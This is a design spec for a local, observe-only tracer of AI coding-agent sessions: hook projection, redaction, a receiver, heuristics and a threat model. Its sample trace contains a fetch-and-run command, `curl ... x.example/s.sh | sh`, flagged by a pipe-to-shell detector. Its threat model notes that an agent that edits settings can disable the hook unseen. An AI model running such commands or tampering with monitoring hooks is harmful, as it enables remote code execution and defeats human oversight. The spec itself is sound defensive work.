# AgentLens — Session Resource Trace (spec)

Status: **spec, not implemented** (2026-10-11). Design contract for the next iteration; when implementation diverges, fix one or the other before shipping. Companion to [threat-scenarios.md](threat-scenarios.md) (declared side), [testing-live-tracking.md](testing-live-tracking.md) (today's `/live`), and [what-agentlens-sees.md](what-agentlens-sees.md) (the privacy inventory this feature revises).

## 1. Purpose and positioning

AgentLens answers "what are my agents *configured* to be allowed to do". The session trace answers the per-session complement: a readable record ("stacktrace") of the resources a Claude Code session — later Gemini CLI / Codex — actually touched: files written (including the repository the session runs in), shell commands, external hosts, MCP tools, skills, dependencies, and an on-disk change diff of the working directory over the session window.

Layer check: still **L2 — observe only**. The trace is built from vendor hook events the user enables and from read-only file-state deltas; AgentLens never sits in the request path, never blocks, never edits configuration, never leaves the machine.

Decisions fixed with the maintainer (2026-10-11):
- **Hooks are the primary source**, enabled by the user per launch (`claude --settings '<json>'`) or by pasting the printed snippet into their own settings. AgentLens prints; it never installs.
- **Transcript import is explicit and opt-in**: `agentlens trace import <file>` on a transcript the user names. `~/.claude/projects` is never scanned.
- **File reads are opt-in** (`--reads`); writes/edits, shell, web, MCP, skills, dependencies and on-disk changes are always in.
- **Claude Code first**; the receiver is vendor-neutral (`platform`) so Gemini `AfterTool` slots in next.

### Vendor facts this rests on (code.claude.com hooks / settings / CLI references, verified 2026-10-11)
`PostToolUse` delivers `tool_name`, `tool_input`, `tool_response`, `tool_use_id`, plus common `session_id`, `prompt_id`, `cwd`, `permission_mode`, `agent_id`/`agent_type` (subagent tool calls fire the same hooks). A hook that prints nothing and exits 0 reports "no decision"; PostToolUse stdout never reaches Claude; `onFailure` defaults to `continue`. `claude --settings` applies "for that session only" and hook entries merge across levels. `SessionEnd` hooks share a 1.5 s budget. Matchers that are not plain names are unanchored JS regexes. `disableAllHooks` / `allowManagedHooksOnly` suppress user hooks; workspace trust gates settings-file hooks (`-p` sessions are treated as trusted). Vendor guidance: hooks run with the user's full permissions; use absolute paths; review hooks.

## 2. Usefulness — verdict: yes, under three conditions

**Value.** The "configured ∩ used" bet made concrete. P1 (power user running `auto`/`acceptEdits`): what a long run actually did — config self-edits, dependency installs, writes outside the repo. P2 (team lead): a local, reviewable artifact for an agent-produced change. P3 (security-curious): the first *used* dimension, which makes scenario confidence `declared+observed` real and severance hints actionable ("declared, never used").

**Why hooks.** Vendor-supported, observe-only when silent, per-launch without any file write, and — decisively — redaction runs *inside the session process* before anything leaves it (the telemetry alternative, `OTEL_LOG_TOOL_DETAILS=1`, exports untruncated commands). Every permanent non-goal holds.

**What it must not become:** a log viewer (no prompts, responses, file contents, edit bodies, stdout/stderr); a tracer/APM (no process or network interception, no durations or tokens); an audit trail with authenticity claims (T12: any local process can post); a transcript indexer.

**Coverage limits, stated on every trace surface:** hooks see tool *invocations* and their declared arguments, not effects — a `Bash` row names the command; the on-disk diff recovers some file effects and attributes everything in the window to the session (the user's own edits, git and build output included); network coverage is `WebFetch` URLs plus hosts parsed from command strings; sessions without the hook (plain `claude -p`/SDK, `disableAllHooks`, `allowManagedHooksOnly`, an untrusted workspace), crashed sessions (no `SessionEnd`) and receiver downtime leave gaps — *absence of events is not proof of inactivity*.

**Conditions:** (1) the hook is provably inert — a test shows empty stdout, exit 0 and bounded wall-clock under every failure; (2) the on-disk diff stays gated to scanned project roots and is rendered as a window delta, never as agent attribution — otherwise cut it and ship events-only; (3) at least one "configured ∩ used" consumer (O4 or the S1/S4 confidence upgrade) ships in the same iteration — without the join to declarations this is a log viewer.

## 3. Data model — `lib/trace.ts`, `TRACE_SCHEMA_VERSION = "0.1.0"`

| Field | Values |
|---|---|
| `eventId` | sha256-16 of `platform\|sessionId\|toolUseId\|kind\|resource` when a tool id exists (hook and import dedup against each other), else `…\|kind\|resource\|eventAt` |
| `platform` | `claude-code \| gemini-cli \| codex-cli` |
| `sessionId`, `promptId`, `agentId`, `agentType`, `toolUseId`, `toolName` | string \| null; all through one redact + truncate chokepoint |
| `kind` | `session-start \| session-end \| scope-change \| file-write \| file-read \| shell \| web \| dependency \| mcp-call \| skill \| subagent \| config-change \| fs-change` |
| `resource` | ≤ 200 chars (≤ 500 for `shell`): repo-relative path when under `cwd`, else absolute (`~` only at render); `scheme://host/path` (query/fragment stripped); `server/tool`; skill name; `manager:spec` |
| `detail` | kind-specific allowlisted object: `{exitCode}`, `{server, tool}`, `{manager, spec, pinned}`, `{statusCode}`, `{source\|reason, cwd, permissionMode, transcriptPath}`, `{dirCount}` (reads), `{change: added\|modified\|touched\|removed, matchedWrite}` |
| `outcome` | `ok \| failed \| denied \| unknown` |
| `confidence` | `vendor-event` (hook) · `derived` (parsed from a command string, server-side) · `observed-on-disk` · `inferred-transcript` — **assigned by the receiver/importer, never accepted from a client** |
| `cwd`, `eventAt`, `receivedAt`, `platformVersion` | strings / nullable |

## 4. Hook contract — `bin/agentlens-hook.mjs`

- Zero-dependency Node ESM; exports `projectHookPayload()` for tests; runs `main()` only when executed directly.
- Arguments: `--port <n>` (fallback `AGENTLENS_PORT`, then 3000) and `--reads`. **No host argument** — `127.0.0.1` is a constant (T14: an agent that edits settings can repoint a port, never a machine). Stdin only; `transcript_path` is stored as a string, never opened.
- Reads stdin up to 4 MiB (beyond: exit 0, send nothing); projects per §6; redacts with the same pattern list as `lib/redact.ts` (patterns duplicated in the hook with a parity test over the SR2 corpus); POSTs `{schemaVersion, events:[one]}` via `node:http` with a 1000 ms deadline for `SessionEnd`, 1500 ms otherwise, hard `process.exit(0)` at 1800 ms. Never writes stdout/stderr, never writes files, always exits 0.
- Settings are printed by `agentlens hook-settings [--port n] [--with-reads]` with absolute `process.execPath` and script path:

```json
{"hooks":{
  "PostToolUse":[{"matcher":"^(Write|Edit|MultiEdit|NotebookEdit|Bash|WebFetch|WebSearch|Skill|Agent|mcp__.+)$",
    "hooks":[{"type":"command","command":"/abs/node /abs/agentlens/bin/agentlens-hook.mjs --port 3000","timeout":3}]}],
  "PostToolUseFailure":["…same…"], "PermissionDenied":["…same…"],
  "SessionStart":[{"hooks":["…"]}], "SessionEnd":[{"hooks":[{"…":"…","timeout":1}]}],
  "SubagentStart":["…"], "SubagentStop":["…"], "ConfigChange":["…"], "CwdChanged":["…"], "DirectoryAdded":["…"]}}
```

`--with-reads` appends `Read|Grep|Glob` to the matcher and `--reads` to the command. The anchored regex (not `*`) keeps Node from spawning on the most frequent tools. Never subscribe to `PreToolUse`, `PermissionRequest`, `UserPromptExpansion` (prompt-bearing) or `Stop`. Existing user hooks keep running (merge semantics). Under `npx` the script path is cache-ephemeral: per-launch `--settings` only; pasting needs a stable install.

## 5. Receiver — `app/api/trace/v1/events/route.ts`

Mirror of the OTLP route: POST + `application/json` only (forces a CORS preflight for remote pages), 256 KiB cap before parse, ≤ 100 events per body, fixed codes `ERR_CONTENT_TYPE 415 / ERR_BODY_TOO_LARGE 413 / ERR_BODY_READ 400 / ERR_JSON_SYNTAX 400`, validation failures counted as `ERR_EVENT_VALIDATION`, no payload echo. Inbound `kind` allowlist excludes `dependency` and `fs-change` (server-generated only); `confidence` forced to `vendor-event`; redaction re-applied; derivation (§7) runs here; `session-start` may trigger the fingerprint (§8). Response `{agentlens:{accepted, duplicates, ignored, droppedAtCap, fingerprint: "started"|"skipped-outside-roots"|"skipped-caps"|"none"}}`. `middleware.ts` already applies loopback-Host validation and the security headers to `/api/*`.

## 6. Projection — allowlist per tool; unknown tools dropped

| Vendor event / tool | kind | resource · detail | Never read |
|---|---|---|---|
| Write, Edit, MultiEdit, NotebookEdit | file-write | `file_path` (`notebook_path` — verify) | `file_text`, `edits[]`, `content` |
| Bash | shell | `command` (≤ 500) · `tool_response.exit_code` | `description`, `stdout`, `stderr` |
| WebFetch | web | scheme + host + path of `url` · `status_code` | `headers`, `body` |
| WebSearch | web | `"web-search"` | the query |
| `mcp__<server>__<tool>` | mcp-call | strip `mcp__`, split at the first `__` | args, result |
| Skill | skill | skill name (field name — verify) | args |
| Agent | subagent | `subagent_type` | `prompt` |
| Read / Grep / Glob (`--reads` only) | file-read | directory of the path; aggregated per directory at render | pattern, content |
| PostToolUseFailure / PermissionDenied | same kinds | `outcome: failed / denied` (denied = not performed; the decision source is never named) | error text |
| ConfigChange | config-change | `source`, file path (verify) | content |
| SessionStart / SessionEnd | session-start / -end | `source`/`reason`, `cwd`, `permission_mode`, `scratchpad_dir`, `transcript_path` | — |
| CwdChanged / DirectoryAdded | scope-change | new path | — |
| SubagentStart / Stop | subagent | `agent_id`, `agent_type` | — |

Every event carries `agent_id`/`agent_type` when present.

## 7. Derived events — `lib/trace-derive.ts` (server-side; shared with import)

From a `shell` resource: `web` rows for `https?://host/path` tokens (query stripped); `dependency` rows for `npm|pnpm|yarn|bun (add|install|i)`, `pip3? install`, `uv (add|pip install)`, `uvx`, `npx -y`, `cargo add`, `go get`, `gem install`, `brew install`, `apt(-get)? install`, with the spec and `pinned` via the exported `PINNED_PACKAGE` regex from `lib/heuristics.ts`. Derived rows reuse the parent `toolUseId`, confidence `derived`.

## 8. On-disk diff — server-side, gated to scanned roots (`lib/fs-fingerprint.ts`, `lib/trace-fs.ts`)

Hook-side is rejected (1.5 s `SessionEnd` budget, large bodies, more code inside the agent's blast radius). Gate: `cwd` must equal or lie under a `projectPath` of the latest verified snapshot or `AGENTLENS_TRACE_ROOTS`; the walk is confined to `cwd`. Walk as `collectors/util.ts` `findFilesNamed` does (no symlinks, resolved-prefix check, `SKIP_DIRS`), caps 20 000 files / 200 MB / 10 s / depth 12, size + mtime only in v1 ("touched" = mtime changed, size equal), one baseline per session id on the first `session-start` (`compact`/`resume` never re-baseline), one walk in flight globally, baseline at `data/observed/trace-fs/<sessionId>.json`, deleted once diffed or after 7 days. At `session-end`: added / modified / touched / removed → `fs-change` events with `matchedWrite` = a `file-write` for the same path exists in the session. No `session-end` → the page says so and offers `agentlens trace close <sessionId>`. Rendered caveat, verbatim: *"Changes during the session window, including your own edits, git and build output; a change is matched to a tool call only when a write event names the same path."*

## 9. Storage — `lib/trace-store.ts`

Generalise `lib/observed-store.ts` into a parameterised NDJSON store (prefix, schema, dedup state key) so OTLP behaviour is byte-identical; traces in `data/observed/trace-YYYY-MM-DD.ndjson`, same 10 MiB / 7-day bounds, already gitignored. Session index derived from segments with an in-process cache keyed by segment mtimes. `loadTraceSession(id)` validates `^[A-Za-z0-9_-]{1,64}$`.

## 10. Surfaces and export

`/sessions`: platform, cwd, start/end, mode, per-kind counts, coverage legend, O-finding count, "localhost origin is not authenticity". `/sessions/<id>`: rows grouped by `promptId`, subagent rows indented under their `Agent` call; "Resources touched" summary (files — agent-config paths highlighted; hosts; MCP servers joined to declared rows; skills; dependencies); on-disk section; observed findings. Legend on both: `vendor-event | derived | observed-on-disk | inferred-transcript`, plus the layout's SR4 banner. `lib/trace-render.ts` feeds `agentlens trace print <id> [--json]`:

```
AgentLens session trace — local record (paths, hosts, commands). Not counts-only: do not paste off-machine.
session 7f3a9c1e · claude-code 2.1.x · cwd ~/src/shop · 14:02:11→14:19:40 · mode acceptEdits
coverage: hook PostToolUse (vendor-event) · derived · on-disk · reads: off
#1 prompt p-01
  14:02:40 file-write  src/api/cart.ts                                   vendor-event
  14:03:05 shell       npm install left-pad                      exit 0  vendor-event
           └ dependency npm:left-pad (unpinned)                         derived      O3
  14:03:30 mcp-call    github/create_issue                       ok      vendor-event  declared ~/.claude.json · H3 unpinned  O4
#2 prompt p-02
  14:10:12 subagent    Explore (agent a1)
    14:10:30 shell     curl -s https://x.example/s.sh | sh       exit 1  vendor-event  O2
  14:11:00 file-write  .claude/settings.local.json                       vendor-event  O1
on-disk window: +src/api/cart.test.ts ~src/api/cart.ts ~package.json ~package-lock.json ~.claude/settings.local.json
  2 changed paths without a matching write event: package.json, package-lock.json
caveat: observations of tool invocations and file-state deltas — not enforcement, not rule attribution; any local process can post events.
```

## 11. Declared-config joins

MCP: exact `server` = `McpServer.name` in the latest non-fixture snapshot → `sourceFile`, `enablement`, H3/H4 refs; no match → "not declared in any collected config file". Config paths: `file-write` / `config-change` resources matched against the instance's `configFiles` and the fixed names (`.claude/settings*.json`, `.mcp.json`, `~/.claude.json`, `.gemini/settings.json`, `.codex/config.toml`, `managed-settings.json`). Skills: new `AgentInstance.skills: {name, kind: "skill"|"plugin", sourceFile}[]` (default `[]`) from `enabledPlugins` keys and directory names under `~/.claude/skills/*/SKILL.md` and `<root>/.claude/skills/*/SKILL.md` — names only.

## 12. Observed heuristics — `lib/trace-heuristics.ts`, type `TraceFinding` (never a `RiskFinding`; never in snapshots or `check`)

| Id | Trigger | Severity | SR4-safe title |
|---|---|---|---|
| O1 | file-write / config-change on an agent-config path | high | "A tool call in this session targeted an agent configuration file: `<path>` — whether the platform applied it is not observed; re-collect to see the declared result" |
| O2 | shell resource matches the exported `PIPE_TO_SHELL` | medium | "A shell command in this session piped remote content to a shell interpreter (parsed from the command string)" |
| O3 | `dependency` row | low; medium if unpinned | "A package install ran in this session: `<spec>` (version unpinned); exit code n" |
| O4 | mcp-call whose declared row has H3-high/H4 or `enablement: null` | high / medium (null) / info (undeclared) | "MCP server "x" was used n times; its declared configuration … (invocation matching, not rule attribution)" |
| O5 | file-write outside `cwd`, `scratchpad_dir` and declared `additionalDirectories`, or matching the exported `HOME_OR_CONFIG_PATH` | medium | "A write targeted a path outside the session's working directory: `<path>`" |

## 13. Scenario confidence upgrade (the Step 6 slice)

`runScenarios` gains optional `observed?: { mcpServersUsed: Map<name, {sessions, lastAt}> }` (7-day window; sessions whose `cwd` is under the instance's `projectPath`, any session for user scope). S1/S4: if the entry server appears, append a precondition `{kind: "observed-event", claim: "MCP server "x" was used in n session(s) in the last 7 days (invocation matching from session traces — never which rule permitted it)", confidence: "observed", refId: "trace:<sessionId>"}`, set `declared+observed`, raise one level ([threat-scenarios.md](threat-scenarios.md) §5, capped at critical). Dashboard only; `agentlens check` stays declared-only this iteration.

## 14. Transcript import — `lib/trace-import.ts`, `agentlens trace import <file.jsonl> [--reads]`

Explicit regular file only (`ERR_NOT_A_FILE`, `ERR_SYMLINK`, 200 MB `ERR_SIZE_CAP`); streamed, 2 MiB per line; recognises `type: "assistant"` lines whose `message.content[]` has `type: "tool_use"` (`id`, `name`, `input`) and `tool_result` blocks for `is_error` only; per-line `sessionId`, `cwd`, `timestamp`, `version` (recorded as the observed format version); same projection and derivation; `confidence: inferred-transcript`, `outcome: unknown` unless `is_error`; no `session-end`, no fingerprint. Malformed lines → `ERR_TRANSCRIPT_SYNTAX`; zero recognised lines → `ERR_TRANSCRIPT_FORMAT`. Prints counts only. Best-effort against an undocumented format (T5 class).

## 15. CLI, launcher, Gemini

`agentlens hook-settings`, `agentlens trace print|import|close` (tsx entry `scripts/trace.ts`, `childEnv(dataDir)` as today). `npm run qa -- claude <recipe>` gains `--trace` (default on in the lab) / `--no-trace`, appending `--settings '<json>'` to the claude argv in `scripts/qa/launchers.ts`; the notice adds "hook settings apply to this process only". Gemini next: same hook with `--platform gemini` (or detection on `hook_event_name: "AfterTool"`); `mcp_<server>_<tool>` is ambiguous on single underscores — resolve by longest declared server-name prefix, else `server: null`; Gemini hooks can block, so the identical print-nothing rule applies.

## 16. Threat-model and SR deltas (to land with the implementation)

- **A6 — Session traces** (`data/observed/trace-*`, `trace-fs/`): per-session paths, hosts, redacted commands, MCP/skill names, file-state deltas; more sensitive than A5; gitignored, bounded, 7-day retention.
- **T14 (realised).** Hook inside the agent loop. Mitigations: constant loopback host, port-only argument, stdin-only input, projection allowlist, redaction before send, no output, exit 0, no file I/O, never opens `transcript_path`; per-launch or explicit paste. Residual (medium): an agent that can write settings or the package directory can remove or alter the hook — the trace is then silently incomplete; O1, `ConfigChange` events and declared-hook drift are the counter-signals; "absence of events is not proof of inactivity" on every page.
- **T12 (extended).** Same gates on the new endpoint; client `confidence` ignored; `fs-change`/`dependency` never inbound; fingerprint only for scanned roots, capped, serialized, read-only with T4 guards. Residual: forged traces by local processes — stated.
- **T17 (new) — transcript import.** A user-named file written by the agent (M2 content): size/line caps, fixed codes, structural allowlist, redaction, symlink refusal; conversation text never parsed. Residual low.
- **Export disclosure.** `trace print` is not counts-only: header warning; never routed through `/share` (the card may add a "sessions traced" count only; extend `tests/share-card.test.ts`).
- **SR text.** SR1: "`agentlens hook-settings` prints; the user passes or pastes it; the hook writes nothing; the fingerprint is a capped read-only walk of scanned roots only." SR2: "hook payloads are projected and redacted inside the session process; file contents, edit bodies, tool outputs, WebFetch headers and prompts are never sent; the receiver redacts again; import applies the same allowlist." SR3a: add the route and "confidence is never client-supplied". SR4: "traces record invocations and file-state deltas, never rule attribution, never agent attribution for `fs-change`; legend on every trace surface; banned phrases apply."
- **Privacy promise** (replaces the transcript line in [what-agentlens-sees.md](what-agentlens-sees.md), merged in the same change as import): *"Session transcripts (`~/.claude/projects/**`): not read, unless you run `agentlens trace import <file>` on a transcript you name. Even then AgentLens keeps only the tool-call structure — tool names, file paths, redacted and truncated command strings, hosts, MCP server and tool names, skill names — never prompts, responses, file contents or tool outputs. A hook-based trace exists only for sessions you start with the AgentLens hook settings."*

## 17. Phased delivery

| Phase | Add / modify | Tests | Acceptance |
|---|---|---|---|
| 1 Events | `bin/agentlens-hook.mjs`, `lib/trace.ts`, `lib/trace-derive.ts`, `lib/trace-store.ts` (generalised from `lib/observed-store.ts`), `app/api/trace/v1/events/route.ts`, `lib/hook-settings.ts`, `lib/trace-render.ts`, `scripts/trace.ts`, `bin/agentlens.mjs`; docs: `what-agentlens-sees.md`, `security-architecture.md`, `threat-model.md` | `tests/trace-projection.test.ts` (per-tool table; secrets in every field redacted; never-read fields absent); `tests/trace-receiver.test.ts` (mirror of `otlp-receiver.test.ts`: gates, codes, kind allowlist, forced confidence, cross-source dedup); `tests/trace-hook-e2e.test.ts` (spawn the real script against an ephemeral loopback server: empty stdout, exit 0, no `file_text`/secret in the body; receiver-down and oversized-stdin paths exit 0 under 2 s); redaction parity test | hook p95 < 150 ms excluding network; `trace print` passes the banned-phrase check |
| 2 UI + heuristics + launcher | `app/sessions/page.tsx`, `app/sessions/[id]/page.tsx`, `app/nav.tsx`, `lib/trace-heuristics.ts`, exported regexes from `lib/heuristics.ts` / `lib/scenario-catalog.ts`, `scripts/qa.ts`, `scripts/qa/launchers.ts`, `docs/testing-qa-lab.md` | `tests/trace-heuristics.test.ts` (trigger + near-miss per O); `tests/sr3-crawl.test.ts` seeds a synthetic trace segment, adds `/sessions`, asserts legend text and banned phrases | both pages pass CSP/headers/no-inline-style; no banned phrase |
| 3 On-disk diff | `lib/fs-fingerprint.ts`, `lib/trace-fs.ts`, receiver trigger, `trace close`, diff section | `tests/trace-fs-diff.test.ts` on a temp root (add/modify/touch/remove; symlink and `node_modules` skipped; caps → `skipped-caps`; cwd outside roots → no walk; SR1 size/mtime invariance of the walked tree) | fingerprint ≤ 10 s on a 20k-file tree |
| 4 Import + joins + confidence | `lib/trace-import.ts`, `tests/fixtures/transcript-synthetic.jsonl`, `collectors/claude-code.ts` + `lib/schema.ts` (skills), `lib/threat-scenarios.ts`, `lib/scenario-catalog.ts` (S1/S4), `app/threat-model/page.tsx`, `docs/collectors.md`, `docs/threat-scenarios.md` | `tests/trace-import.test.ts` (prompt text absent from storage; fixed codes; format-version note); `tests/scenario-catalog.test.ts` (upgrade fixture + near-miss: a server used in another project must not upgrade); `tests/settings-coverage.test.ts` (skills) | privacy-page revision in the same change as import |

## 18. Risks and verify-at-implementation

- Hook latency per tool call (Node start ≈ 40–80 ms) — mitigated by the anchored matcher; measure in Phase 1.
- Event volume is small (~300 B/event); a runaway loop can hit the 10 MiB day cap — counted and stated.
- **Verify against vendor docs on the implementation day:** `prompt_id` presence in hook stdin; stdin fields of `PermissionDenied`, `ConfigChange`, `FileChanged`, `SubagentStart/Stop`, `SessionEnd`; `Skill` and `NotebookEdit` input field names; whether anchored regex matchers are accepted; whether `--settings`-supplied hooks are subject to workspace trust (if so, the lab's untrusted recipes trace nothing until trusted — state it); whether `/clear`/`resume` keep the session id; minimum `timeout` granularity.
- Windows: `--settings` JSON quoting in cmd/PowerShell (recommend a settings file); hook path quoting with spaces.
- A `--settings` hook is invisible to the collector (already under "invisible by nature"); the hook cannot tell how it was installed.
- `fs-change` without hashing cannot separate content changes from mtime bumps; hashing small files at baseline is a Phase 3 open question.

## 19. Acceptance (end to end, after Phase 2)

1. `npm run typecheck && npm run lint && npm test` — new suites green; SR1/SR3 unchanged.
2. `npm run qa -- up`, then `npm run qa -- claude drift-playground` (trace on by default): add an allow rule via `/permissions`, run `npm install left-pad`, fetch a URL; exit. `/sessions/<id>` shows the `file-write` on `.claude/settings.local.json` (O1), the `shell` + derived `dependency` (O3), the `web` row, and — after Phase 3 — the on-disk delta with `package.json`/lockfile flagged as changes without a matching write.
3. `agentlens trace print <id>` reproduces the text format; `agentlens hook-settings` output pasted into a settings file traces a plain `claude` session too.
4. Receiver down: run a session anyway; Claude is unaffected, and the page later states the gap.
5. After Phase 4: import the synthetic fixture (`inferred-transcript` rows, no prompt text in `data/observed`), and confirm S1 on the lab's `s1-supply-chain` flips to `declared+observed` after one session that calls its server.
